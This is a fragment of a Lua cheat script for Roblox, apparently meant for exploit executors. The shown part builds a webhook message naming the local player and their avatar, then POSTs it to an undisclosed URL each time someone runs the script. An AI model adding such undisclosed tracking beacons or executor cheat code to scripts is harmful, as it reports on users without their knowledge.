   ["content"] = "Void Beta @xx1xx1x1x1",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Assassin Void Beta**",
           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
           ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
